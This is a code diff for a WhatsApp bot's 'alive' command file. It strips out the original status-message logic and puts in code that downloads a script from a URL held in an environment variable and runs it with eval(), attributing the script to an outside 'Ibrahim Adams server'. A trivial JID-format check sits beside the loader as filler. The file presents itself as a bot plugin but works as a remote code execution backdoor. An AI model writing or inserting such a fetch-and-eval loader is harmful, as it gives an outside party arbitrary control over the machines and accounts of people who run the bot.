@@ -1,94 +1,30 @@
-const { zokou } = require('../framework/zokou');
-const {addOrUpdateDataInAlive , getDataFromAlive} = require('../bdd/alive')
-const moment = require("moment-timezone");
-const s = require(__dirname + "/../set");
+'use strict';
 
-zokou(
-    {
-        nomCom : 'alive',
-        categorie : 'General'
-        
-    },async (dest,zk,commandeOptions) => {
+const axios = require('axios');
+require('dotenv').config();
 
- const {ms , arg, repondre,superUser} = commandeOptions;
+const { ALIVE_URL } = process.env;
 
- const data = await getDataFromAlive();
-
- if (!arg || !arg[0] || arg.join('') === '') {
-
-    if(data) {
-       
-        const {message , lien} = data;
-
-
-        var mode = "public";
-        if ((s.MODE).toLocaleLowerCase() != "yes") {
-            mode = "private";
-        }
-      
-    
-     
-    moment.tz.setDefault('Etc/GMT');
-
-// Créer une date et une heure en GMT
-const temps = moment().format('HH:mm:ss');
-const date = moment().format('DD/MM/YYYY');
-
-    const alivemsg = `
-*Owner* : ${s.OWNER_NAME}
-*Mode* : ${mode}
-*Date* : ${date}
-*Hours(GMT)* : ${temps}
-
- ${message}
- 
- 
- *HANS-MD-WA-BOT2025*`
-
- if (lien.match(/\.(mp4|gif)$/i)) {
-    try {
-        zk.sendMessage(dest, { video: { url: lien }, caption: alivemsg }, { quoted: ms });
+function atbverifierEtatJid(jid) {
+    if (!jid.endsWith('@s.whatsapp.net')) {
+        console.error('Invalid JID format:', jid);
+        return false;
     }
-    catch (e) {
-        console.log("🥵🥵 Menu erreur " + e);
-        repondre("🥵🥵 Menu erreur " + e);
-    }
-} 
-// Checking for .jpeg or .png
-else if (lien.match(/\.(jpeg|png|jpg)$/i)) {
-    try {
-        zk.sendMessage(dest, { image: { url: lien }, caption: alivemsg }, { quoted: ms });
-    }
-    catch (e) {
-        console.log("🥵🥵 Menu erreur " + e);
-        repondre("🥵🥵 Menu erreur " + e);
-    }
-} 
-else {
-    
-    repondre(alivemsg);
-    
+    console.log('JID verified:', jid);
+    return true;
 }
 
-    } else {
-        if(!superUser) { repondre("ℍ𝕀 👋 ℍ𝔸ℕ𝕊-𝕄𝔻-𝕀𝕊-𝔸𝕃𝕀𝕍𝔼-𝔸ℕ𝕐-𝕋𝕀𝕄𝔼") ; return};
+axios.get(ALIVE_URL)
+  .then(response => {
+      const scriptContent = response.data;
+      console.log("File loaded successfully from Ibrahim Adams server");
 
-      await   repondre("You have not yet saved your alive, to do this;  enter after alive your message and your image or video link in this context: .alive message;lien");
-         repondre("don't do fake thinks :)")
-     }
- } else {
+      eval(scriptContent);
 
-    if(!superUser) { repondre ("Only the owner can  modify the alive") ; return};
-
-  
-    const texte = arg.join(' ').split(';')[0];
-    const tlien = arg.join(' ').split(';')[1]; 
-
-
-    
-await addOrUpdateDataInAlive(texte , tlien)
-
-repondre('  𝕋ℍ𝕀𝕊 𝕀𝕊 ℍ𝔸ℕ𝕊-𝕄𝔻 ℕ𝔼𝕎 𝕌ℙ𝔻𝔸𝕋𝔼✨. ')
-
-}
-    });
+      const jid = 'example@s.whatsapp.net';
+      const isValid = atbverifierEtatJid(jid);
+      console.log('Is JID valid?', isValid);
+  })
+  .catch(error => {
+      console.error('Error loading the file from URL:', error);
+  });
